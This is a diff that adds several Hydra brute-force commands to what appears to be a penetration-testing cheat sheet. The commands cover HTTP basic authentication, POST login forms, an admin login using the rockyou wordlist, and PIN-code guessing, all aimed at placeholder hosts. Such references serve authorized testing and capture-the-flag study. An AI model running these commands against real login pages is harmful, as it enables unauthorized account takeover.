@@ -433,6 +433,22 @@ ping name
 ```sh
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/admin/:user=^USER^&pass=^PASS^&Login:Username or password invalid"
 ```
+**Basic Http Authentication**
+```sh
+hydra -L users.txt -P passwords.txt http-get://example.com/
+```
+**Post Request for Login Forms**
+```sh
+hydra -L users.txt -P passwords.txt http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login" -V
+```
+**Web Login BruteForce**
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V example.com http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login"
+```
+**Web Page Pin Codes BruteForcing**
+```sh
+hydra -l user -P pin_codes.txt http-post-form "/login.php:user=^USER^&pin=^PASS^:Invalid PIN" -V
+```
 ## Brute Forcing
 **Crafting Wordlist**
 - [RawSec](https://inventory.raw.pm/overview.html)
